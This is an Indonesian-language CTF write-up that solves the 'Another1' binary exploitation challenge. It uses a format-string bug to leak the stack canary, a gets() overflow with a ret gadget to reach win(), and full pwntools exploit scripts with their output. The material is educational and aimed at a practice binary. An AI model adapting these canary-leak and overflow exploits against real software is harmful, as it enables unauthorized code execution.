# Another1

note: chall ini di ambil dari website [tcp1p](https://tcp.1pc.tf/challenges#challenge=933). 
official metadata : [2026](https://github.com/LKS-ID/2026-LKSN-Jakarta-Daring-Public/blob/4dfbdda890e7217f72ecf86b72b3c24657b3dbba/Binary%20Exploitation/another_1/challenge.yml)

## deskripsi 
Author: Enryu (binary asli) · Dimas Maulana / TCP1P (adaptasi layanan)

Inspect the original public ELF in Cutter, verify the stack behavior with Pwndbg, then connect to your personal TCP instance. Recover the team-specific flag printed by the  
service. The attached source model is a reconstruction. The original binary is by Enryu (LKSN 2026); the per-team service is a classroom adaptation by Dimas Maulana / TCP1P

file : [chall](chall)

## analisis & solve step by step
analisis di awali dengan pemeriksaan metadata serta proteksi aktif yang ada pada file chall terlampir:
<p align="center"> <img width="930" height="159" alt="image" src="https://github.com/user-attachments/assets/6bde19b1-163b-4a95-8bca-412f7db7830f" /> </p>

lalu ku lanjutkan dengan menjalankan file untuk mencari tahu perilaku permukaan dari program tersebut.

awal di jalankan: meminta nama dan mencetak menu.
```
└> ./chall
========================================
  NATIONAL BANK
  Secure Transaction Terminal
========================================

Welcome valued customer.
We take your security SERIOUSLY.
Every transaction is protected by military-grade stack canaries.

Enter your name: kira

========== Menu ==========
  1. View Profile
  2. Change PIN
  3. Exit
==========================
Choice:
```

pilihan 1:
```
Choice: 1

--- Profile ---
Name: kiraRole:   Customer
Status: Active
```
pilihan 2:
```
Choice: 2

--- Change PIN ---
Enter new 6-digit PIN: 123456
PIN updated successfully!
```
pilihan 3 : keluar dari program
```
Choice: 3
Goodbye, kira!
```

observasi:
- jenis file:  ELF 64-bit LSB executable
- Proteksi Aktif: Partial Relro, Canary, NX
- perilaku: program menyediakan layanan `melihat profil` dan `mengganti PIN` sebagai bank nasional.


sedikit mencoba , aku menemukan kerentanan **format string** pada **menu 1** , aku menyadari input nama di awal program akan dicetak lagi ketika menu 1 dipilih, dan sengaja
mengirim string %p pada input tersebut. program mencetak nama ku dengan sebuah alamat memori. ini bisa terjadi karena fungsi printf() langsung mencetak variabel tanpa 
sintaks format string
___
```
Enter your name: %p
```
```
Choice: 1
--- Profile ---
Name: 0x7fff620bee00Role:   Customer
Status: Active
```
___

karena tidak menemukan hal lain, analisis ku lanjutkan dengan mendecompilenya menggunakan ghidra. banyak hal ku temukan pada hasil decompilasinya.

pertama terdapat kerentanan buffer overflow pada menu 2. input 6 digit pin ternyata dilakukan menggunakan fungsi gets. ini praktik berbahaya karena fungsi gets akan menerima 
input sebanyak apapun sebelum enter di tekan.
___
```C
if (iVar1 != 2) break;
puts("\n--- Change PIN ---");
printf("Enter new 6-digit PIN: ");
gets(local_38);
puts("PIN updated successfully!");
```
variabel local_38
```
char local_38 [40];
long local_10;
```
jangan lupakan terdapat **canary** di `local_10`.
___


kedua adalah target eksploitasi yang jelas. aku menemukan di program ini terdapat fungsi bernama `win` yang akan mencetak flag. namun fungsi ini tidak di panggil di alur
normal program. dia hanya ada.

win()
```C
void win(void)

{
  system("cat ./flag*");
  return;
}

```

setelah analisis singkat ini aku bisa menyimpulkan 

kerentanan tercatat:
- format string
- buffer overflow
- alamat statis (PIE tidak aktif)

tujuan eksploitasi
- memaksa program mengeksekusi fungsi win

rencana awal
- mendapatkan nilai canary untuk bypass proteksi (via format string)
- menimpa return address dengan alamat fungsi win (via buffer overflow)
- win tereksekusi dan flag di cetak.

## eksploitasi

pertama aku harus mencari tahu value dari canary terlebih dahulu. ciri ciri nya adalah hex random 16 byte yang berakhir dengan 2 nol. titik kerentanan yang memungkinkan
aku melakukan leak seperti itu adalah input nama pertama . dan memilih menu 1 untuk membaca alamat memori yang bocor.

untuk mempermudah proses pencarian canary aku menulis skrip python :
```python
from pwn import *

elf = context.binary = ELF('./chall')
context.log_level = 'error'

def leaker():
    for i in range(32):
        p = process()
        pay = f'DDDD%{i}$p'
        p.sendlineafter(b'name:',pay.encode())
        p.sendlineafter(b'Choice: ',b'1')
        p.recvuntil(b'DDDD')`

        data = p.recvline().strip().replace(b'Role:   Customer',b'')
        print(i,'-',data.decode())
        p.close()

leaker()
```
canary tereteksi di index ke 17
```
17 - 0xea004b6c26850100
```
hex 16 byte dengan 2 nol di belakang, kandidat pertama yang bagus.

selanjutnya yang ku butuhkan adalah panjang buffer input pin yang ku butuh kan agar return addres tertimpa dengan value yang aku inginkan (win address). informasi ini ku 
dapatkan dari decompilasi fungsi main. input pin tersimpan di variabel `local_38` dimana pada dekompilasi tertulis local_48 adalah tipe data char array sebanyak 40 bytes.
```
char local_38 [40];
```
artinya buffer atau jarak byte dari input pin ke return address adalah 40 byte.
untuk informasi alamat win, aku menggunakan fitur bawaan lib pwntools (sym[<nama_fungsi>]).

maka rencana payload nya adalah 
```
padding 40 byte + leaked canary + win address
```

namun susunan payload ini tidak bekerja, dan aku baru ingat bahwa dalam stack , sebelum buffer menyentuh return addres, masih ada saved rbp sebanyak 8 byte di file binary
64 bit. maka susunan payload yang sudah diperbaiki adalah 
```
padding 40 byte + leaked canary + padding 8 byte + win address
```

percobaan dengan payload ini juga belum berhasil mencetak flag. setelah berpikir cukup lama aku baru sadar mungkin masalah utamanya adalah stack alignment, simpelnya ini adalah
sebuah masalah ketika alamat fungsi tidak sejajar dengan stack . cukup sulit di jelaskan, namun masalah itu bisa di selesaikan menggunakan gadget return.

untuk mencari gadget return aku butuh alamat memori di file biner ini yang memiliki instruksi return. pencarian dilakukan menggunakan tools `ROPgadget`
```
└> ROPgadget --binary ./chall | grep ret
```
hasil pencarian
```
0x000000000040101a : ret
```
jadi alamat gadget nya adalah `0x40101a` aku bisa langsung menggunakannya karena binary ini tidak memiliki proteksi pie sehingga alamat memori seluruh progam akan tetap sama.

payload akhir:
```
padding 40 byte + leaked canary + padding 8 byte + win address
```

solver skrip: 
```python
from pwn import *

elf = context.binary = ELF('./chall')
context.log_level = 'error'


def main():
    p = process()
    # p = remote('127.0.0.1', 1337)
    pay = f'DDDD%17$p'
    p.recvuntil(b'name:')
    p.sendline(pay.encode())
    p.recvuntil(b'Choice: ')
    p.sendline(b'1')
    p.recvuntil(b'DDDD')

    canary = p.recvline().strip().replace(b'Role:   Customer',b'')
    print("canary: ",canary.decode())
    canary = int(canary,16)

    pad = b'A' * 40 
    win = elf.sym.win
    print('fungsi win: ',hex(win))
    ret = 0x000000000040101a
    pay = flat(
        pad,
        canary,b'a'*8,
        ret,
        win
    )

    p.recvuntil(b'Choice: ')
    p.sendline(b'2')
    p.recvuntil(b'PIN: ')
    p.sendline(pay)

    p.recvuntil(b'Choice: ')
    p.sendline(b'3')

    p.interactive()

main()
```

result :
```
┌[rotalactf]-[LAPTOP-6QMID52F]-(another1)
└> python3 solver.py
[*] '/home/rotalactf/reno/pwn/tcp1p/another1/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
canary:  0xa31ac6e2460f1200
fungsi win:  0x4011a6
Goodbye, DDDD%17$p!
DEBUGFLAG{omaga_flag_flag_flag}
$
```
debug flag berhasil didapatkan, sekarang saatnya mengammbil flag asli dengan merubah target dari local ke remote server.

<p align="center"><img width="413" height="324" alt="image" src="https://github.com/user-attachments/assets/d14d170c-c295-4f99-9bfb-48e15c1ad39a" /></p>

flag: `rsctf{practice_another1_ecbba6e2f7b81366}`

challenge ini memiliki banyak kerentanan fatal yang menyebabkan pengguna bisa memaksa program untuk mengeksekusi fungsi seperti win. kerentanan tercatat di sini adalah 
**format string** , **buffer overflow** dan **static address memory (no PIE)** 
tiap kerentanan berhubungan dan membentuk rantai eksploitasi yang berbahaya.
